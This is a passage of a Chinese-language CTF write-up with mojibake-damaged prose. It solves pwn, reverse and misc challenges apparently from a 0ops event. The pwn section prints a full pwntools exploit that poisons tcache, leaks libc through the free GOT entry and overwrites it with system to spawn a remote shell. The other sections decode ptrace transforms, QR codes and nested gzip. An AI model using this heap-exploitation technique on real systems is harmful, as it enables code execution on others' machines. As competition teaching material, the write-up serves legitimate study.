†å—çš„åŒºåŸŸèµ·å§‹åœ°å€ï¼‰ã€‚è¿™æ ·å½“æˆ‘ä»¬å†mallocä¸€ä¸ªå¯ç”¨å¤§å°ä¸º0x330åˆ°0x338å¤§å°çš„å †å—æ—¶ï¼Œå°±ä¼šè¿”å›<code>heap_manager</code>çš„åœ°å€ã€‚æˆ‘ä»¬å¾€è¿™é‡Œé¢å¡«å…¥0x1000å’Œfree_gotçš„åœ°å€ï¼Œè¿™æ ·ç¨‹åºè‡ªå®šä¹‰çš„å †ç®¡ç†å™¨å°±ä¼šè®¤ä¸ºindex0å¤„ä¹‹å‰mallocäº†ä¸€ä¸ªå¯ç”¨å¤§å°ä¸º0x1000çš„å †å—ï¼Œä¸”ä½äºfree_gotã€‚å› æ­¤æˆ‘ä»¬è¿™æ—¶å†<code>puts(0)</code>å°±ä¸ä¼šæŠ¥é”™ï¼Œä¹Ÿå°±èƒ½å¤Ÿleakå‡ºlibcä¸­freeçš„åœ°å€ï¼Œä¹Ÿå°±çŸ¥é“äº†libcçš„åŸºåœ°å€ã€‚ç„¶ååˆ©ç”¨è¿™ä¸ªåŸºåœ°å€çŸ¥é“systemçš„åœ°å€ï¼Œå¾€0å†™å…¥è¿™ä¸ªåœ°å€ï¼Œä¹Ÿå°±å°†freeåŠ«æŒåˆ°systemã€‚æœ€åæˆ‘ä»¬<code>free(1)</code>ï¼Œ1æ˜¯æˆ‘ä»¬ä¹‹å‰æ”¾<code>/bin/sh</code>çš„åœ°æ–¹ï¼Œæ­¤æ—¶æ‰§è¡Œ<code>system('/bin/sh')</code>ï¼Œå¾—åˆ°shellã€‚</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">'./flat'</span>)</span><br><span class="line">libc = binary.libc</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = binary.process()</span></span><br><span class="line">p = remote(<span class="string">'111.186.57.85'</span>, <span class="number">40246</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index, size, data</span>):</span><br><span class="line">    p.sendline(<span class="string">b'768'</span>) </span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b'4919'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, data</span>):</span><br><span class="line">    p.sendline(<span class="string">b'2989'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_0_end</span>(<span class="params">index, data</span>):</span><br><span class="line">    p.sendline(<span class="string">b'4112'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b'57005'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    <span class="keyword">return</span> p.recvline().strip()</span><br><span class="line"></span><br><span class="line">free_got = binary.got[<span class="string">'free'</span>]</span><br><span class="line">heap_manager = <span class="number">0x4060B0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># we will use this to get libc leak and control free_got</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x500</span>, <span class="string">b'a'</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 is used to get control of tcache</span></span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x90</span>, <span class="string">b'b'</span>)</span><br><span class="line"><span class="comment"># 3 is used to make a tcache bin</span></span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x330</span>, <span class="string">b'c'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_manager)*(<span class="number">0x90</span>//<span class="number">8</span>))</span><br><span class="line"><span class="comment"># now tcace bin is</span></span><br><span class="line"><span class="comment"># 0x340 [  1]: 0x4060b0 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment"># 0x350 [  0]: 0x4060b0 â—‚â€” ...</span></span><br><span class="line">payload=p64(<span class="number">0x1000</span>)+p32(free_got)</span><br><span class="line"><span class="comment"># now we control the heap_manager</span></span><br><span class="line"><span class="comment"># we make index 0 's size 0x1000</span></span><br><span class="line"><span class="comment"># and we make index 1 's pointer to free_got</span></span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x330</span>,payload)</span><br><span class="line"><span class="comment"># this will puts what is on the free_got</span></span><br><span class="line">response = puts(<span class="number">0</span>)</span><br><span class="line">libc_leak = response[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">libc.address = u64(libc_leak) - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">info(<span class="string">f'[LEAK&amp;CALC]: libc_base: <span class="subst">{<span class="built_in">hex</span>(libc.address)}</span>'</span>)</span><br><span class="line">system = libc.sym[<span class="string">'system'</span>]</span><br><span class="line"><span class="comment"># we overwrite free_got with system</span></span><br><span class="line">edit_0_end(<span class="number">0</span>,p64(system))</span><br><span class="line"><span class="comment"># 1's pointer point to /bin/sh</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>flag:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0ops{learning_deflat_trick_to_defeat_ollvm}</span><br></pre></td></tr></tbody></table></figure><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="Peer-Trace"><a href="#Peer-Trace" class="headerlink" title="Peer-Trace"></a>Peer-Trace</h3><p>è¿™é“é¢˜çš„è€ƒå¯Ÿç‚¹æ˜¯ptraceå’Œstraceçš„ç”¨æ³•ã€‚</p><p>peerç¨‹åºä¼šè°ƒç”¨puppetç¨‹åºï¼Œå¹¶ä½¿ç”¨ptraceæ¥åœ¨ä¸åŒè¿è¡Œæ—¶åˆ»ç›‘è§†peerç¨‹åºå¹¶ä¿®æ”¹å…¶å†…å­˜/å¯„å­˜å™¨çš„å€¼ã€‚</p><p>å…ˆä»<a href="https://www.jianshu.com/p/b1f9d6911c90">ç½‘ä¸Š</a>å­¦ä¹ äº†ä¸‹ptraceçš„ç”¨æ³•ï¼Œä¸»è¦å…³æ³¨<code>PTRACE_POKEDATA</code>, <code>PTRACE_SETREGS</code>å› ä¸ºè¿™ä¸¤ä¸ªä¼šä¿®æ”¹è¢«ç›‘è§†å­ç¨‹åºçš„å†…å­˜/å¯„å­˜å™¨ã€‚</p><p>puppetç¨‹åºçš„é€»è¾‘æ˜¯è¯»å–ä¸€ä¸ªè¾“å…¥ï¼Œé•¿åº¦éœ€è¦ä¸º48å­—èŠ‚ï¼Œç„¶åé€å­—èŠ‚ä¸0x28å¼‚æˆ–ï¼Œæœ€åä¸ctåŒºåŸŸçš„48å­—èŠ‚åšæ¯”è¾ƒã€‚</p><p>å»ºè®®ä½¿ç”¨<code>strace</code>è§‚å¯Ÿç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­<code>ptrace</code>ç›¸å…³å†…å®¹ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace ./peer</span><br></pre></td></tr></tbody></table></figure><p>peerç¨‹åºçš„ä¸»è¦é€»è¾‘å¯ä»¥é€šè¿‡è§‚å¯Ÿ<code>PTRACE_POKEDATA</code>, <code>PTRACE_SETREGS</code>å’Œç›¸åº”çš„idaä¼ªä»£ç å¾—åˆ°ï¼š</p><ol><li><p>å¯¹è¾“å…¥çš„48å­—èŠ‚åšä¸‹é¢çš„é€»è¾‘ï¼š</p><ul><li>åˆ†ä¸º8ç»„ï¼Œå¯¹æ¯ç»„ï¼š</li><li>äº¤æ¢0ï¼Œ5</li><li>äº¤æ¢1ï¼Œ7</li><li>äº¤æ¢2ï¼Œ6</li><li>*((_BYTE *)v25 + j) -= j + iï¼Œå…¶ä¸­jæ˜¯ç»„å†…ç´¢å¼•ï¼Œiæ˜¯ç»„å·ï¼Œv25æ˜¯æ¯ç»„çš„èµ·å§‹åœ°å€</li><li>äº¤æ¢3ï¼Œ4</li></ul></li><li><p>åœ¨å¼‚æˆ–0x28åï¼ŒåŠ«æŒç¨‹åºï¼Œå¯¹æ¯ä¸ªå­—èŠ‚åšå¦‚ä¸‹ä¿®æ”¹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v25[<span class="number">0</span>] = <span class="number">0xA39C3E6994313F40</span>LL;</span><br><span class="line">v25[<span class="number">1</span>] = <span class="number">0x17872470565B9B60</span>LL;</span><br><span class="line">v25[<span class="number">2</span>] = <span class="number">0x11A918AABA97CA68</span>LL;</span><br><span class="line">v25[<span class="number">3</span>] = <span class="number">0xB8F1B0AB9B3DD3B0</span>LL;</span><br><span class="line">v25[<span class="number">4</span>] = <span class="number">0x488749FB6A1835E4</span>LL;</span><br><span class="line">v25[<span class="number">5</span>] = <span class="number">0x82926F78FE98158</span>LL;</span><br></pre></td></tr></tbody></table></figure><p>æ¯ä¸ªå­—èŠ‚åˆ†åˆ«ä¸peerä¸­æ­¤æ—¶çš„v25ä¸­å¯¹åº”å­—èŠ‚ç›¸åŠ ï¼Œèˆå»è¿›ä½ã€‚</p></li></ol><p>æœ€åå†ä¸puppetç¨‹åºä¸­ctåŒºåŸŸçš„48å­—èŠ‚ä½œæ¯”è¾ƒï¼Œéœ€è¦ç›¸ç­‰ã€‚æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯ç›¸å¯¹ç®€å•çš„å¯é€†è¿‡ç¨‹ï¼Œå°†ç®—æ³•åè¿‡æ¥å³å¯ã€‚å®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v25 = p64(<span class="number">0xA39C3E6994313F40</span>) + p64(<span class="number">0x17872470565B9B60</span>) + p64(<span class="number">0x11A918AABA97CA68</span>) + p64(<span class="number">0xB8F1B0AB9B3DD3B0</span>) + p64(<span class="number">0x488749FB6A1835E4</span>) + p64(<span class="number">0x82926F78FE98158</span>)</span><br><span class="line">ct = p64(<span class="number">0xe3de41c1f389569c</span>) + p64(<span class="number">0x3500a2b1a46c9bd1</span>) + p64(<span class="number">0x890a29f3d010d481</span>) + p64(<span class="number">0x200f1fca08a04513</span>) + p64(<span class="number">0xc3ab5b0381564f00</span>) + p64(<span class="number">0x08953b09bbf7fdc7</span>)</span><br><span class="line"><span class="comment"># tmp1 is the bytearray after xored</span></span><br><span class="line">tmp1 = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="comment"># each byte in tmp is the result of ct[i] - v25[i]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    <span class="keyword">if</span> ct[i] &lt; v25[i]:</span><br><span class="line">        tmp1.append(ct[i] + <span class="number">256</span> - v25[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp1.append(ct[i] - v25[i])</span><br><span class="line"><span class="comment"># tmp1 is the bytearray before xored with 0x28</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    tmp1[i] ^= <span class="number">0x28</span></span><br><span class="line"><span class="built_in">print</span>(tmp1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse</span>(<span class="params">cypher</span>):</span><br><span class="line">    <span class="comment"># group cypher into 8 bytes</span></span><br><span class="line">    cypher = [cypher[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cypher), <span class="number">8</span>)]</span><br><span class="line">    <span class="comment"># for each group, we decrypt it</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cypher)):</span><br><span class="line">        <span class="comment"># swap BYTE3 and BYTE4</span></span><br><span class="line">        tmp = cypher[i][<span class="number">3</span>]</span><br><span class="line">        cypher[i][<span class="number">3</span>] = cypher[i][<span class="number">4</span>]</span><br><span class="line">        cypher[i][<span class="number">4</span>] = tmp</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            cypher[i][j] += j + i*<span class="number">8</span></span><br><span class="line">        <span class="comment"># swap BYTE2 and BYTE6</span></span><br><span class="line">        tmp = cypher[i][<span class="number">2</span>]</span><br><span class="line">        cypher[i][<span class="number">2</span>] = cypher[i][<span class="number">6</span>]</span><br><span class="line">        cypher[i][<span class="number">6</span>] = tmp</span><br><span class="line">        <span class="comment"># swap BYTE1 and BYTE7</span></span><br><span class="line">        tmp = cypher[i][<span class="number">1</span>]</span><br><span class="line">        cypher[i][<span class="number">1</span>] = cypher[i][<span class="number">7</span>]</span><br><span class="line">        cypher[i][<span class="number">7</span>] = tmp</span><br><span class="line">        <span class="comment"># swap BYTE0 and BYTE5</span></span><br><span class="line">        tmp = cypher[i][<span class="number">0</span>]</span><br><span class="line">        cypher[i][<span class="number">0</span>] = cypher[i][<span class="number">5</span>]</span><br><span class="line">        cypher[i][<span class="number">5</span>] = tmp</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the result</span></span><br><span class="line">    result = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cypher)):</span><br><span class="line">        result += <span class="built_in">bytes</span>(cypher[i])</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse(tmp1)</span><br></pre></td></tr></tbody></table></figure><p>flag:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0ops{tr@cE_traC1Ng_tRAc3d_TRaces_z2CcT8SjWre0oP}</span><br></pre></td></tr></tbody></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="QrCode2"><a href="#QrCode2" class="headerlink" title="QrCode2"></a>QrCode2</h3><p>æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯äºŒç»´ç çš„ç»“æ„å’Œæ ‡å‡†<del>qrazyboxçš„ä½¿ç”¨</del>ã€‚</p><p>ä¹‹å‰åœ¨åšhackergameè¿˜æ˜¯geekgameçš„æ—¶å€™ç¢°åˆ°ä¸€é“åç»´ç ï¼Œæ˜¯åå®¹é“å’ŒäºŒç»´ç è¿˜åŸçš„ç»“åˆã€‚é¢˜ç›®æ²¡åšå‡ºæ¥ï¼Œä½†æ˜¯åœ¨ç¾¤é‡Œçœ‹åˆ°ä¸ªäºŒç»´ç ä»™äººï¼Œæ•´å¤©åœ¨ç¾¤é‡Œå‘ä»–è¿˜åŸäºŒç»´ç çš„è¿‡ç¨‹ã€‚è¿™ä¸‹çœŸç”¨ä¸Šäº†ï¼Œå¿«è¯´è°¢è°¢äºŒç»´ç ä»™äººã€‚</p><p>è´´ä¸€ä¸ª<a href="https://www.bilibili.com/video/BV1Au4m1g7vT">äºŒç»´ç ä»™äººçš„äºŒç»´ç æ•™ç¨‹</a></p><p>è¦ç”¨åˆ°çš„å·¥å…·æ˜¯<a href="https://merri.cx/qrazybox/">qrazybox</a></p><p>ç”±äºå®šä½å—ç¼ºå¤±ï¼Œæˆ‘å…ˆç›´æ¥æ ¹æ®å›¾ç‰‡æŠŠå·²çŸ¥çš„é»‘è‰²ç™½è‰²éƒ½å¡«å……ä¸Šï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªè¯•çº é”™ç­‰çº§ï¼Œå‘ç°åªæœ‰M0æ˜¯ç¬¦åˆçš„ï¼Œç„¶åç”¨qrazyboxçš„toolsæŠŠpadding bitsè¡¥ä¸Šï¼š</p><p><img src="https://bu.dusays.com/2024/04/26/662b49dd8ec19.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b49dd8ec19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å¤åŸ"></p><p>ä½†æ˜¯ç¼ºå¤±çš„å†…å®¹å®åœ¨å¤ªå¤šäº†ï¼Œæ— è®ºæ˜¯ç›´æ¥æå–è¿˜æ˜¯ç”¨Reed-Solomon Decoderéƒ½å¾—ä¸åˆ°flagï¼Œä½†æ˜¯é€šè¿‡Data Sequence Analysiså¯ä»¥çœ‹åˆ°message dataæœ‰ä¸€ä¸ª<code>}</code>ï¼Œè€Œé¢˜ç›®å·²ç»å‘Šè¯‰æˆ‘ä»¬è¿™é¢˜çš„flagæ ¼å¼ä¸ºflag{.*}ï¼Œæ ¹æ®äºŒç»´ç æ ¼å¼ï¼Œæˆ‘ä»¬å°†å‰5ä½message dataä¿®æ”¹ä½<code>flag{</code>ï¼Œè¿™æ—¶å€™å†ç”¨Reed-Solomon Decoderå·²ç»å¯ä»¥å¾—åˆ°flagäº†ã€‚</p><p>ä¿®æ”¹æ•°æ®åçš„ç»“æœï¼š</p><p><img src="https://bu.dusays.com/2024/04/26/662b49f0e4f27.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b49f0e4f27.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="final"></p><p>flag:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{D4+4_2e(0\/3R_v_!5_S0_3a5_v}</span><br></pre></td></tr></tbody></table></figure><h3 id="WhereIsMyFlag"><a href="#WhereIsMyFlag" class="headerlink" title="WhereIsMyFlag"></a>WhereIsMyFlag</h3><p>æœ¬é¢˜è€ƒå¯Ÿçš„æ˜¯<del>è§†åŠ›</del>å’Œå¯¹æ•°æ®çš„å¤„ç†èƒ½åŠ›ã€‚</p><p>åœ¨githubçš„commitè®°å½•æœ€åå¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip; <span class="keyword">import</span> base64; gzip.decompress(base64.b64decode(<span class="string">'H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='</span>))</span><br></pre></td></tr></tbody></table></figure><p>è¿è¡Œè¿™æ®µä»£ç å‘ç°å¤„ç†åçš„æ•°æ®è¿˜æ˜¯<code>1f8b</code>å¼€å¤´ï¼Œæ¨æ–­ä»ç„¶æ˜¯gzipã€‚ç›´æ¥å†™åˆ°æ–‡ä»¶é‡Œå»ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">x = gzip.decompress(base64.b64decode(<span class="string">'H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"out.gz"</span>, <span class="string">"wb+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(x)</span><br></pre></td></tr></tbody></table></figure><p>ç„¶åå†ç»ˆç«¯åå¤è§£å‹ç¼©ï¼Œå¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶åstringsä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gzip -d out.gz</span><br><span class="line"><span class="built_in">mv</span> out out.gz</span><br><span class="line">gzip -d out.gz</span><br><span class="line">strings ./out</span><br></pre></td></tr></tbody></table></figure><p>å°±å¯ä»¥å¾—åˆ°flag:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{760671da3ca23cae060262190c01e575873c72e6}</span><br></pre></td></tr></tbody></table></figure><h3 id="RealOrNot"><a href="#RealOrNot" class="headerlink" title="RealOrNot"></a>RealOrNot</h3><p>æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯å†™è„šæœ¬çš„èƒ½åŠ›ï¼Œå¤§æ¦‚ã€‚</p><p>pow challenge åº”è¯¥æ˜¯åŒºå—é“¾ä¸­çš„æ¦‚å¿µï¼Ÿä½†æ˜¯å’Œè¿™é“é¢˜å…³ç³»ä¸å¤§ï¼Œè¿™é¢˜çš„pow challengeç›´æ¥è®©AIå°±èƒ½å†™ï¼Œè¦èŠ±å¤ªé•¿æ—¶é—´çš„challengeå°±è·³è¿‡å¥½äº†ã€‚</p><p>ç»™çš„server.pyå¹¶ä¸ä¼šè¾“å‡ºç¬¬å‡ å¼ å›¾ç‰‡åˆ¤æ–­é”™äº†ï¼Œä½†æ˜¯å®é™…äº¤äº’æ—¶æ˜¾ç¤ºäº†ã€‚è€Œä¸”åœ¨æˆ‘æŠŠæ‰€æœ‰å›¾ç‰‡éƒ½æ— é‡å¤åœ°ä¿å­˜ä¸‹æ¥åå‘ç°æ€»å…±åªæœ‰100å¼ å›¾ç‰‡ï¼ŒæœåŠ¡å™¨ä¼šæ¯æ¬¡é€‰20å¼ è®©æˆ‘ä»¬åˆ¤æ–­çœŸä¼ªï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆå°†æ‰€æœ‰å›¾ç‰‡éƒ½éšä¾¿æ‰“ä¸Šæ ‡ç­¾ï¼Œç„¶åæ ¹æ®æ ‡ç­¾å»å‘æœåŠ¡å™¨å‘é€ç­”æ¡ˆï¼ŒæœåŠ¡å™¨æ¯æ¬¡éƒ½ä¼šç»™æˆ‘ä»¬çº é”™ä¸€å¼ ï¼Œæˆ‘ä»¬æ ¹æ®é”™è¯¯ä¿¡æ¯ä¿®æ”¹å¯¹åº”å›¾ç‰‡çš„æ ‡ç­¾ï¼Œå¾ˆå¿«å°±èƒ½å°†æ‰€æœ‰å›¾ç‰‡çš„æ ‡ç­¾éƒ½ä¿®æ”¹æ­£ç¡®ã€‚è¿™æ—¶æ— è®ºæœåŠ¡å™¨é€‰å“ª20å¼ æˆ‘ä»¬éƒ½èƒ½ç»™å‡ºæ­£ç¡®çš„ç­”æ¡ˆã€‚</p><p>ä¿å­˜å›¾ç‰‡çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 